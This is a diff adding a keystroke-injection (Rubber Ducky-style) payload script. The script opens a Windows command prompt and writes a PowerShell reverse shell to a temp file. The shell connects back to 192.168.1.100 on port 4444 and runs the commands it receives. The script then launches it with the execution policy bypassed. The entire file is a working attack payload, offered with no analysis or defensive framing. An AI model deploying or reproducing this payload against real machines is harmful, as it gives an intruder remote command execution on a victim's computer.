@@ -1,0 +1,37 @@
+REM Open a command prompt
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+
+REM Write the reverse shell script
+STRING echo $TCPClient = New-Object System.Net.Sockets.TCPClient('192.168.1.100', 4444) > %TEMP%\revshell.ps1
+ENTER
+STRING echo $NetworkStream = $TCPClient.GetStream() >> %TEMP%\revshell.ps1
+ENTER
+STRING echo $StreamWriter = New-Object System.IO.StreamWriter($NetworkStream) >> %TEMP%\revshell.ps1
+ENTER
+STRING echo $StreamReader = New-Object System.IO.StreamReader($NetworkStream) >> %TEMP%\revshell.ps1
+ENTER
+STRING echo while (^$true) { >> %TEMP%\revshell.ps1
+ENTER
+STRING echo ^$Command = ^$StreamReader.ReadLine() >> %TEMP%\revshell.ps1
+ENTER
+STRING echo if (^$Command -eq "exit") { break } >> %TEMP%\revshell.ps1
+ENTER
+STRING echo ^$Output = cmd.exe /c ^$Command 2^>^&1 >> %TEMP%\revshell.ps1
+ENTER
+STRING echo ^$StreamWriter.WriteLine(^$Output) >> %TEMP%\revshell.ps1
+ENTER
+STRING echo ^$StreamWriter.Flush() >> %TEMP%\revshell.ps1
+ENTER
+STRING echo } >> %TEMP%\revshell.ps1
+ENTER
+STRING echo $TCPClient.Close() >> %TEMP%\revshell.ps1
+ENTER
+
+REM Execute the PowerShell script
+STRING powershell -ExecutionPolicy Bypass -File %TEMP%\revshell.ps1
+ENTER
+
